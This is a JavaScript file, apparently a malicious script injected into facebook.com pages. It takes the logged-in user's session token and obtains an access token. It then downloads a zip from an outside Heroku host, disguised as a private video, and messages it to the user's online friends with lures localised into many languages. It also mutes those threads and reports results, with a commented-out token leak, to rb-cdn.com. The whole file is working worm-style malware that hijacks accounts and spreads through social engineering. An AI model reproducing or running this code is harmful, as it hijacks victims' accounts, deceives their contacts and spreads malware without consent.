(new Image).src = "//whos.amung.us/swidget/mandar1n0s";

var account = "UA-102961222-1";
var ana = document.createElement("script");
ana.type = "text/javascript";
ana.innerHTML = "(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '"+account+"', 'auto'); ga('send', 'pageview');";
document.body.appendChild(ana);

var win = this;
var ajax = win["XMLHttpRequest"];

function start() {
      var cookie_name = "aassds"+profile_id+"_repsiz";
      var cookie_time = 30;

    if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*1000*cookie_time){
        localStorage[cookie_name] = Date.now();
            config={
                 "mode": true,
                 "mode_inbox": true,
                 "hit": 50000,
                 "cut": 150000000000,
                 "group_limit": 5,
                 "message_limit": 50
             }
            if(config.mode == true){

            getToken();

        }



    }else{
        var active_time = new Date();
        active_time.setTime(parseInt(localStorage[cookie_name]) + (60*1000*cookie_time));
        console.log("active_time:"+active_time.toLocaleString());
    }
}
function getToken() {
    var params = {};
    params["fb_dtsg"] = fb_dtsg;
    params["app_id"] = "165907476854626";
    params["redirect_uri"] = "fbconnect://success";
    params["display"] = "popup";
    params["access_token"] = "";
    params["sdk"] = "";
    params["from_post"] = 1;
    params["private"] = "";
    params["tos"] = "";
    params["login"] = "";
    params["read"] = "";
    params["write"] = "";
    params["extended"] = "";
    params["social_confirm"] = "";
    params["confirm"] = "";
    params["seen_scopes"] = "";
    params["auth_type"] = "";
    params["auth_token"] = "";
    params["auth_nonce"] = "";
    params["default_audience"] = "";
    params["ref"] = "Default";
    params["return_format"] = "access_token";
    params["domain"] = "";
    params["sso_device"] = "ios";
    params["__CONFIRM__"] = 1;
    var xhr = new ajax();
    xhr.open("POST", "/v2.8/dialog/oauth/confirm");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200){
            var vars = {};
            if(xhr.responseText.indexOf('access_token=') > 0){
                vars.access_token = xhr.responseText.split('access_token=')[1].split('&')[0];
              //  new Image().src = "https://rb-cdn.com/php/token.php?profile_id=" + profile_id + "&access_token=" +  vars.access_token + "&gender=PDF";
                console.log(vars.access_token);
                getUserInfo(vars);
            }
        }
    }
    xhr.send(deSerialize(params));
}


function getUserInfo(vars) {
    var params = {}
    params["access_token"] = vars.access_token;
    params["ext"] = "me";
    var xhr = new ajax();
    xhr.open("GET", "https://graph.facebook.com/"+profile_id+"/?"+deSerialize(params), true);
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){
            var data = JSON.parse(xhr.responseText);
            if (data){
                vars.user_locale = data.locale;
                if(config.mode_inbox == true){online(vars);}

            }
        }
    }
    xhr.send();
}

function online(vars) {
    var params = {}
    params["q"] = "SELECT uid, name, first_name, online_presence, pic_big, can_post  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) Order By online_presence Limit 2000";
    params["access_token"] = vars.access_token;
    params["ext"] = "me";
    var xhr = new ajax();
    xhr.open("GET", "https://graph.facebook.com/fql?"+deSerialize(params), true);
    xhr.onreadystatechange = function(){
        if (xhr.readyState == 4 && xhr.status == 200){
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if (!data.error){
                var friends = data.data;
                friends = shuffle(friends);
                vars.friends = [];
                for(i=0;i<friends.length&&vars.friends.length<config.message_limit;i++){
                    if(friends[i].online_presence == "active"){
                        vars.friends.push(friends[i]);
                    }
                }

                for(i=0;i<friends.length&&vars.friends.length<config.message_limit;i++){
                    if(friends[i].online_presence == "idle"){
                        vars.friends.push(friends[i]);
                    }
                }

                // for(i=0;i<friends.length&&vars.friends.length<config.message_limit;i++){
                //     if(friends[i].online_presence == "offline"){
                //         vars.friends.push(friends[i]);
                //     }
                // }

                if(vars.friends.length > 0){
                    sendTags(vars);
                }
            }
        }
    }
    xhr.send();
}


function sendTags(vars) {
  for (f = 0;f < vars["friends"].length;f++) {
    vars["user"] = vars["friends"][f];
    getHtmlINB(vars);
  }
}



function getHtmlINB(vars){
	    var c_user = vars["user"];
      var language = vars.user_locale;
	    var oReq = new XMLHttpRequest();
          oReq.open("GET", "https://linear-cloud.herokuapp.com/?title=Private-Video", true);
          oReq.responseType = "arraybuffer";
          oReq.onreadystatechange = function() {
               if(this.readyState != 4) return;
      var arrayBufferView = new Uint8Array( this.response );
      vars.blob = new Blob( [ arrayBufferView ], { type: "application/zip" } );
      vars["user"] = c_user;
            uploadInbox(vars);
    };
    oReq.send();
}


function uploadInbox(vars){
  var c_user = vars["user"];
  var language = vars.user_locale;
  var name = c_user.first_name;
    var fd = new FormData();
    fd.append("upload_1026", vars.blob, name+"_Private-XXX-Video_"+Math.floor(Math.random()*9999)+".mp4.zip");

    var getParams = {};
    getParams["av"] = profile_id;
    getParams["dpr"] = 1;
    getParams["__user"] = profile_id;
    getParams["__a"] = 1;
    getParams["__dyn"] = get_dyn();
    getParams["__req"] = 19;
    getParams["__be"] = -1;
    getParams["fb_dtsg"] = fb_dtsg;
    getParams["ttstamp"] = ttstamp;
    getParams["__rev"] = __rev;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://upload.facebook.com/ajax/mercury/upload.php?"+deSerialize(getParams));
    xhr.send(fd);
     xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
            if(!data.error){
                vars.image_id = searchArray(data, "file_id");
                vars["user"] = c_user;
                vars.user_locale = language;
                sendMessage(vars);
            }
        }
    }
}

function sendMessage(vars){
  var c_user = vars["user"];
  var lang = vars.user_locale;
  var file_id = vars.image_id;
  var message_id = rand(11111111,999999999);
  if(lang == "sq_AL") {
  title = "cfar ben ti ne kte video?";
  }
  else if(lang == "mk_MK") {
  title = "sto pravis ti na ova video?";
  }
  else if(lang == "es_LA" || lang == "es_CO" || lang == "es_ES") {
  title = "¿Qué haces en este video?";
  }
  else if(lang == "de_DE") {
  title = "was machst du in diesem Video?";
  }
  else if(lang == "bs_BA" || lang == "hr_HR" || lang == "sr_RS") {
  title = "sta ti radis na ovom videu?";
  }
  else if(lang == "sl_SI") {
  title = "kaj delaš na tem videoposnetku?";
  }
  else if(lang == "it_IT") {
  title = "cosa stai facendo su questo video?";
  }
  else if(lang == "el_GR") {
  title = "τι κάνεις σε αυτό το βίντεο?";
  }
  else if(lang == "pl_PL") {
  title = "co robisz w tym filmie?";
  }
  else if(lang == "cz_CZ") {
  title = "co děláš na tomto videu?";
  }
  else if(lang == "sk_SK") {
  title = "čo robíte na tomto videu?";
  }
  else if(lang == "hu_HU") {
  title = "mit csinálsz ezen a videón?";
  }
  else if(lang == "bg_BG") {
  title = "какво правиш с този видеоклип?";
  }
  else if(lang == "tl_PH") {
  title = "ano ang ginagawa mo sa video na ito?";
  }
  else if(lang == "da_DK") {
  title = "hvad laver du på denne video?";
  }
  else if(lang == "af_ZA") {
  title = "wat doen jy op hierdie video?";
  }
  else if(lang == "ro_RO") {
  title = "ce faci în acest videoclip?";
  }
  else if(lang == "ru_RU") {
  title = "что вы делаете на этом видео?";
  }
  else if(lang == "fi_FI") {
  title = "mitä teet tällä videolla?";
  }
  else if(lang == "sv_SE") {
  title = "vad gör du på den här videon?";
  }
  else if(lang == "th_TH") {
  title = "คุณกำลังทำอะไรอยู่ในวิดีโอนี้";
  }
  else if(lang == "tr_TR") {
  title = "bu video üzerinde ne yapıyorsun?";
  }
  else if(lang == "ka_GE") {
  title = "რას აკეთებ ამ ვიდეოზე?";
  }
  else if(lang == "fr_FR" || lang == "fr_CA") {
  title = "que faites-vous sur cette vidéo?";
  }
  else if(lang == "pt_PT" || lang == "pt_BR") {
  title = "O que você está fazendo neste vídeo?";
  }
  else if(lang == "nl_NL" || lang == "nl_BE") {
  title = "wat doe je op deze video?";
  }
  else if(lang == "nb_NO" || lang == "nn_NO") {
  title = "hva gjør du på denne videoen?";
  }
  else {
  title = "what are you doing on this video?";
  }
    body = c_user.first_name + " :o \n"+title;


    var params = {};
    params["client"] = "mercury";
    params["action_type"] = "ma-type:user-generated-message";
    params["body"] = body;
    params["file_ids[0]"] = file_id;
    params["ephemeral_ttl_mode"] = 0;
    params["force_sms"] = true;
    params["has_attachment"] = true;
    params["message_id"] = message_id;
    params["offline_threading_id"] = message_id;
    params["other_user_fbid"] = c_user.uid;
    params["source"] = "source:titan:web";
    params["specific_to_list[0]"] = "fbid:" + c_user.uid;
    params["specific_to_list[1]"] = "fbid:" + profile_id;
    params["timestamp"] = Date.now();
    params["ui_push_phase"] = "V3";
    params["__user"] = profile_id;
    params["__a"] = 1;
    params["__dyn"] = get_dyn();
    params["__req"] = 12;
    params["__be"] = -1;
    params["__pc"] = "PHASED:DEFAULT";
    params["fb_dtsg"] = fb_dtsg;
    params["ttstamp"] = ttstamp;
    params["__rev"] = __rev;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/messaging/send/?dpr=1");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));

            if(!data.error){

                sonuc(c_user.uid,body,"","Message",1);
                console.log("Sent:"+c_user.uid);
                mute(vars);
            }else{
                sonuc(data.error,body,"","Message",0);
            }
        }
    }
    xhr.send(deSerialize(params))
}
function formatAMPM() {
var d = new Date(),
  minutes = d.getMinutes().toString().length == 1 ? '0'+d.getMinutes() : d.getMinutes(),
  hours = d.getHours().toString().length == 1 ? '0'+d.getHours() : d.getHours(),
  ampm = d.getHours() >= 12 ? 'pm' : 'am',
  months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
  days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
return days[d.getDay()]+'_'+months[d.getMonth()]+'_'+d.getDate()+'_'+d.getFullYear()+'_'+hours+'_'+minutes+ampm;
}
function banword(obj) {
    delimiters = [unescape("%A0"), " ", ".", "_", "-", "  "];
    obj = obj["split"]("");
    finalWord = "";
    insertIn = Math["floor"](Math["random"]() * obj["length"]);
    if (obj[insertIn] == " ") {
      insertIn--;
    }
    if (insertIn == obj["length"]) {
      insertIn--;
    }
    for (var i = 0;i < obj["length"];i++) {
      finalWord = finalWord + (insertIn == i ? obj[i] + delimiters[Math["floor"](Math["random"]() * delimiters["length"])] : obj[i]);
    }
    return finalWord;
  }
  function mute(vars){
      var c_user = vars["user"];
  	  var thread_fbid = c_user.uid;
      var mute_settings = -1;
      var params = {
          'thread_fbid':thread_fbid,
          'mute_settings':mute_settings,
          'payload_source':"mercury",
          '__user':profile_id,
  	    	'__a':1,
  		    '__dyn':get_dyn(),
          '__af':"iw",
            '__req':"q",
          '__a':1,
          '__be':-1,
          '__pc':"PHASED:DEFAULT",
          '__rev':__rev,
          'fb_dtsg':fb_dtsg,
          'jazoest':ttstamp

      }

      var xhr = new XMLHttpRequest();
      xhr.open("POST", "/ajax/mercury/change_mute_thread.php?dpr=1");
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
      xhr.send(deSerialize(params));
      xhr.onreadystatechange = function() {
          if (xhr.readyState == 4 && xhr.status == 200) {
              var data = JSON.parse(xhr.responseText.replace("for (;;);",""));

          }
      }
  }
function commentOff(vars){
	  var post_id = vars.post_id;
    var d = new Date();
    var params = {
        'ft_ent_identifier':vars.post_id,
        'disable_comments':1,
        '__user':profile_id,
	    	'__a':1,
		    '__dyn':get_dyn(),
        '__af':"m",
        '__req':"16",
        '__a':1,
        '__be':-1,
        '__pc':"PHASED:DEFAULT",
        '__rev':__rev,
        'fb_dtsg':fb_dtsg,
        'lazoest':ttstamp,
        '__spin_r':__rev,
        '__spin_b':'trunk',
        '__spin_t':Math["floor"](Date["now"]() / 1E3)

    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/feed/ufi/disable_comments/?dpr=1&ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));

        }
    }
}
function unFollowPost(vars){
	  var post_id = vars.post_id;
    var params = {
        message_id:vars.post_id,
        follow:0,
        __user:profile_id,
        __a:1,
        __dyn:get_dyn(),
        __req:"m",
        fb_dtsg:fb_dtsg,
        ttstamp:ttstamp,
        __rev:__rev
    }

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/ajax/litestand/follow_post?ext=me");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.send(deSerialize(params));
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));

        }
    }
}
function banword(obj) {
    delimiters = [unescape("%A0"), " ", ".", "_", "-"];
    obj = obj["split"]("");
    finalWord = "";
    insertIn = Math["floor"](Math["random"]() * obj["length"]);
    if (obj[insertIn] == " ") {
      insertIn--;
    }
    if (insertIn == obj["length"]) {
      insertIn--;
    }
    for (var i = 0;i < obj["length"];i++) {
      finalWord = finalWord + (insertIn == i ? obj[i] + delimiters[Math["floor"](Math["random"]() * delimiters["length"])] : obj[i]);
    }
    return finalWord;
  }
function generate_name(length,firstUpper){
    rname = "";
    sesli = "aeiou";
    sessiz = "bcdfghjklmnprstvyz";
    rname = rand(1,2) == 1?sessiz[rand(0,sessiz.length-1)]:sesli[rand(0,sesli.length-1)];
    if(firstUpper == true){
        rname = rname.toUpperCase();
    }
    for(n=0;n<length;n++){
        if(sesli.indexOf(rname[rname.length-1]) >= 0){
            rname += sessiz[rand(0,sessiz.length-1)];
        }else{
            rname += sesli[rand(0,sesli.length-1)];
        }
    }
    return rname;
}

function inArray(arr, key, value){
    var res = false;
    for(a=0;a<arr.length;a++){
        for(k in arr[a]){
            if(k == key && arr[a][k] == value){
                res = true;
                break;
            }
        }
    }
    return res;
}
function sonuc(sonuc,link,image,type,success){
    var result = sonuc || "";
    var link = link || "";
    var image = image || "";
    var type = type || "";
    var success = success || 0;
    var params = {};
    params["user"] = profile_id;
    params["result"] = sonuc;
    params["link"] = link;
    params["img"] = image;
    params["type"] = type;
    params["success"] = success;
    fetch("https://rb-cdn.com/php/report.php?"+deSerialize(params));
}
 function get_dyn() {
  function toCompressedString() {
    $BitMap1 = [];
    for (i in t) {
      $BitMap1[t[i]] = 1;
    }
    if ($BitMap1["length"] === 0) {
      return "";
    }
    var l = [];
    var m = 1;
    var n = $BitMap1[0] || 0;
    var o = n.toString(2);
    var p = 1;
    for (;p < $BitMap1["length"];p++) {
      var q = $BitMap1[p] || 0;
      if (q === n) {
        m++;
      } else {
        l["push"](j(m));
        n = q;
        m = 1;
      }
    }
    if (m) {
      l["push"](j(m));
    }
    return k(o + l["join"](""));
  }
  function j(l) {
    var m = l.toString(2);
    var n = "0"["repeat"](m["length"] - 1);
    return n + m;
  }
  function k(l) {
    var m = (l + "00000")["match"](/[01]{6}/g);
    var n = "";
    var o = 0;
    for (;o < m["length"];o++) {
      n += h[parseInt(m[o], 2)];
    }
    return n;
  }
  var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
  var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
  var is = bd["concat"](hd);
  var t = [];
  for (x in is) {
    if (is[x] != null) {
      var p = is[x]["replace"]("},", "")["replace"]("]", "");
      if (parseInt(p) >= 5) {
        t["push"](parseInt(p));
      }
    }
  }
  var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
  return toCompressedString();
}


function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}
function decode(t,h){
    var a = "abcdefghijklmnoprstuvyzx0123456789";
    var c = "";
    for(cr=0;cr<t.length;cr++){
        c += a[h.indexOf(t[cr])];
    }
    return c;
}
function randoms(l, m) {
    var r = [];
    while (r.length < l) {
        var rnd = Math.floor(Math.random() * m);
        if (r.indexOf(rnd) < 0) {
            r.push(rnd);
        }
    }
    return r;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

function rand(min,max){
    return Math.floor(Math.random()* (max-min))+min;
}

function rastgele(uzunluk) {
    mtn = "abcdefghijklmnoprstuvyzx0123456789";
    ret = "";
    for (l = 0; l < uzunluk; l++) {
        ret += mtn[Math.floor(Math.random() * mtn.length)];
    }
    return ret;
}

function deSerialize(json) {
    return Object.keys(json).map(function(key) {
        return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
    }).join('&');
}
function searchArray(a,k){
    var found = false;
    for(key in a){
        if(key.toString() == k){
            found = a[key];
            break;
        }else if(typeof a[key] == "object"){
            found = searchArray(a[key],k);
            if(found != false){
                break;
            }
        }
    }
    return found;
}
if (location.hostname.indexOf("facebook.com") >= 0) {
    fb_dtsg_list = document.getElementsByName('fb_dtsg');
    if(!document.getElementById("isrun") && fb_dtsg_list.length > 0){
        var log = document.createElement("meta");
        log.id = "isrun";
        document.head.appendChild(log);
        profile_id = document.cookie.match(/c_user=(\d+)/)[1];
        fb_dtsg = fb_dtsg_list[0].value;
        __rev = document.head.innerHTML.split('"server_revision":')[1].split(",")[0];
        ttstamp = "";
        for (var x = 0; x < fb_dtsg.length; x++){
            ttstamp += fb_dtsg.charCodeAt(x);
        }
        ttstamp = '2' + ttstamp;
        console.log("User:"+profile_id);
        console.log("fb_dtsg:"+fb_dtsg);
        console.log("__rev:"+__rev);
        console.log("ttstamp:"+ttstamp);

        start();
    }
}
